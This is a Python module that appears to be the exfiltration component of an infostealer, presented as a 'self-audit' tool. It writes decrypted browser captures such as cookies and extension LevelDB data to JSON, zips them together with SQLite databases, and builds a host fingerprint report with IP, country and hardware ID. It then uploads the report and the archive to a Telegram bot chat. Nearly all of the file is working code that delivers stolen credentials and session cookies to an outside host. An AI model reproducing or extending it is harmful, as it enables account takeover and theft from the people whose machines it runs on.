"""Report builder + Telegram transport.

Transport reality that shapes this file (verified against api.telegram.org):
  * HTTPS only - plain http:// is refused outright.
  * File uploads must be multipart/form-data; a urlencoded or raw octet-stream
    body is rejected. So requests-toolbelt's MultipartEncoder does the framing.
  * A bot's upload ceiling is 50 MB. The archive cap here is 25 MB, so one send
    fits; anything larger has to be split rather than silently truncated.
  * sendMessage caps at 4096 chars, so a long report is chunked on line
    boundaries instead of sliced mid-record.

The destination comes from config.telegram_destination(), which reads env vars.
Nothing in this module contains a token or a chat id.
"""
from __future__ import annotations

import io
import json
import os
import zipfile
from datetime import datetime, timezone

import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

API = "https://api.telegram.org"
MAX_ARCHIVE = 25 * 1024 * 1024
MSG_LIMIT = 4096


def _ep(token: str, method: str) -> str:
    return f"{API}/bot{token}/{method}"


# ------------------------------------------------------------------ archive
def write_items(stage: str, caps) -> list[str]:
    """Persist decrypted capture items into the staging tree as JSON.

    Without this, `cap.items` lives only in memory: the report prints counts and
    the zip ships only staged files (extension LevelDB etc.), so a run that
    "captured 704 cookies" delivers zero cookie data. One file per capture kind,
    named <kind>.json under items/. Returns the paths written.
    """
    out = []
    items_dir = os.path.join(stage, "items")
    for c in caps:
        if not getattr(c, "items", None):
            continue
        try:
            os.makedirs(items_dir, exist_ok=True)
            safe = "".join(ch if ch.isalnum() or ch in "-_" else "_" for ch in c.kind)
            path = os.path.join(items_dir, f"{safe}.json")
            with open(path, "w", encoding="utf-8") as f:
                json.dump({"kind": c.kind, "note": c.note, "items": c.items},
                          f, ensure_ascii=False, indent=1, default=str)
            out.append(path)
        except OSError:
            continue   # one unwritable kind must not drop the rest
    return out


def build_archive(stage: str, out_path: str, caps) -> tuple[str, int, int]:
    """Zip the staging tree under a hard size cap. Returns (path, size, n_files).

    Files past the cap are skipped whole rather than written partially, so the
    archive never contains a truncated SQLite DB that would fail to open.
    """
    total = 0
    n = 0
    with zipfile.ZipFile(out_path, "w", zipfile.ZIP_DEFLATED, compresslevel=6) as z:
        for root, _, files in os.walk(stage):
            for fn in sorted(files):
                ap = os.path.join(root, fn)
                try:
                    sz = os.path.getsize(ap)
                except OSError:
                    continue
                if total + sz > MAX_ARCHIVE:
                    continue
                try:
                    z.write(ap, os.path.relpath(ap, stage))
                    total += sz
                    n += 1
                except (OSError, zipfile.BadZipFile):
                    continue
    return out_path, os.path.getsize(out_path), n


# ------------------------------------------------------------------ text report
def render_report(caps, system: dict, probe_rows=None) -> str:
    lines = [
        f"# Self-audit capture report",
        f"host: {system.get('hostname','?')}  user: {system.get('username','?')}",
        f"platform: {system.get('platform','?')} {system.get('release','?')} "
        f"({system.get('machine','?')})  elevation: {system.get('elevation','?')}",
        f"time: {system.get('utc','?')}",
        "",
        "## capture results",
    ]
    for c in caps:
        lines.append(f"- {c.kind}: {c.count} item(s){' | ' + c.note if c.note else ''}")
    lines.append("")
    lines.append("## system")
    for k in ("ip", "country", "cpus", "ram_gb", "gpu", "screen", "hwid"):
        if system.get(k) not in (None, ""):
            lines.append(f"- {k}: {system[k]}")
    if probe_rows:
        locked = [r for r in probe_rows if r["verdict"] != "available"]
        if locked:
            lines.append("")
            lines.append("## stores NOT captured (and why)")
            for r in locked:
                lines.append(f"- {r['source']}/{r['store']}: {r['verdict']} - {r['detail']}")
    return "\n".join(lines)


def chunk_text(text: str, limit: int = MSG_LIMIT) -> list[str]:
    """Split on newline boundaries so a record is never cut in half."""
    out, cur = [], ""
    for line in text.split("\n"):
        while len(line) > limit:            # pathological single line
            out.append(cur); cur = ""
            out.append(line[:limit]); line = line[limit:]
        if len(cur) + len(line) + 1 > limit:
            out.append(cur); cur = line
        else:
            cur = f"{cur}\n{line}" if cur else line
    if cur:
        out.append(cur)
    return [c for c in out if c.strip()]


# ------------------------------------------------------------------ transport
class Transport:
    def __init__(self, token: str, chat_id: str, timeout: int = 60):
        self.token = token
        self.chat_id = str(chat_id)
        self.timeout = timeout
        self.sent: list[str] = []
        self.errors: list[str] = []

    def _post(self, method: str, **kw) -> bool:
        try:
            r = requests.post(_ep(self.token, method), timeout=self.timeout, **kw)
        except requests.RequestException as e:
            self.errors.append(f"{method}: {type(e).__name__}: {e}")
            return False
        if r.status_code != 200:
            self.errors.append(f"{method}: HTTP {r.status_code} {r.text[:180]}")
            return False
        body = r.json()
        if not body.get("ok"):
            self.errors.append(f"{method}: telegram {body.get('error_code')} {body.get('description','')[:180]}")
            return False
        return True

    def check(self) -> tuple[bool, str]:
        """getMe probe. Run this BEFORE capturing - discovering a dead bot after a
        full collection wastes the whole run."""
        try:
            r = requests.get(_ep(self.token, "getMe"), timeout=15)
        except requests.RequestException as e:
            return False, f"network: {type(e).__name__}"
        if r.status_code != 200:
            return False, f"HTTP {r.status_code} (bad token)"
        d = r.json().get("result", {})
        return True, f"@{d.get('username','?')}"

    def text(self, s: str) -> bool:
        ok = all(self._post("sendMessage", data={
            "chat_id": self.chat_id, "text": part, "disable_web_page_preview": "true"})
            for part in chunk_text(s))
        if ok:
            self.sent.append("text")
        return ok

    def file(self, path: str, caption: str = "") -> bool:
        if not os.path.isfile(path):
            self.errors.append(f"file missing: {path}")
            return False
        size = os.path.getsize(path)
        if size > 50 * 1024 * 1024:
            self.errors.append(f"file {size} exceeds Telegram 50MB bot limit")
            return False
        with open(path, "rb") as f:
            fields = {"chat_id": self.chat_id}
            if caption:
                fields["caption"] = caption[:1024]
            fields["document"] = (os.path.basename(path), f, "application/zip")
            enc = MultipartEncoder(fields)
            ok = self._post("sendDocument", headers={"Content-Type": enc.content_type}, data=enc)
        if ok:
            self.sent.append(f"file:{os.path.basename(path)}")
        return ok
